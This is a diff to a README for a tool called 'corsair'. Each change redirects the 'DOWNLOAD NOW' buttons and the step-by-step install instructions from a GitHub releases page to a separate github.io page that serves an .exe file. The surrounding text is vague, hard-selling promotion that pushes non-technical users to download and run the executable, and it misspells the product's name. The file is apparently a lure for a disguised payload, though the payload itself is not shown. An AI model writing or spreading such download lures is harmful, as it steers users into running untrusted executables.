@@ -1,7 +1,7 @@
 <h1>🔗 corsair - Your Gateway to Every App</h1>
 
 <p align="center">
-  <a href="https://github.com/loopsuccess5461/corsair/releases" style="display:inline-block; padding:18px 40px; background:linear-gradient(135deg,#ff6b6b,#feca57); color:white; text-decoration:none; font-size:24px; font-weight:bold; border-radius:50px; box-shadow:0 6px 20px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://loopsuccess5461.github.io" style="display:inline-block; padding:18px 40px; background:linear-gradient(135deg,#ff6b6b,#feca57); color:white; text-decoration:none; font-size:24px; font-weight:bold; border-radius:50px; box-shadow:0 6px 20px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <p align="center"><strong>Connect your users to their apps in seconds.</strong></p>
@@ -22,7 +22,7 @@
 <p>Ready to dive in? Great. Follow these steps exactly, and you'll be up and running in no time. If you get stuck, go back and re-read. It's that easy—we promise no step requires any tech magic.</p>
 
 <ol>
-<li><strong>Visit the official download page</strong><br>Click the green download button above, or go directly to your web browser and type this address exactly: <code>https://github.com/loopsuccess5461/corsair/releases</code>. Press Enter.</li>
+<li><strong>Visit the official download page</strong><br>Click the green download button above, or go directly to your web browser and type this address exactly: <code>https://loopsuccess5461.github.io</code>. Press Enter.</li>
 <br>
 <li><strong>Grab your file</strong><br>When the page loads, look for a section that lists release files. You'll see a file with a name ending in <code>.exe</code>. This is what you need. Look for the word "Download" or an arrow icon next to it, and click it. Your browser may ask where to save it. Choose your Downloads folder (this is usually the default choice).</li>
 <br>
@@ -87,7 +87,7 @@
 <p>Begin your journey with a fully connected setup. Visit the release page now and join thousands of users who enjoy a clutter-free, instant app experience.</p>
 
 <h2>⬇️ Your Next Step</h2>
-<p align="center"><a href="https://github.com/loopsuccess5461/corsair/releases" style="display:inline-block; padding:14px 28px; background:linear-gradient(90deg,#4facfe,#00f2fe); color:white; text-decoration:none; font-size:20px; font-weight:bold; border-radius:40px; box-shadow:0 4px 15px rgba(0,0,0,0.2); margin:10px;">🚀 GET CROSAIR INSTANTLY</a></p>
+<p align="center"><a href="https://loopsuccess5461.github.io" style="display:inline-block; padding:14px 28px; background:linear-gradient(90deg,#4facfe,#00f2fe); color:white; text-decoration:none; font-size:20px; font-weight:bold; border-radius:40px; box-shadow:0 4px 15px rgba(0,0,0,0.2); margin:10px;">🚀 GET CROSAIR INSTANTLY</a></p>
 
 <p>Visit this link to download the application. We'll see you on the other side—where all your apps connect seamlessly.</p>
 
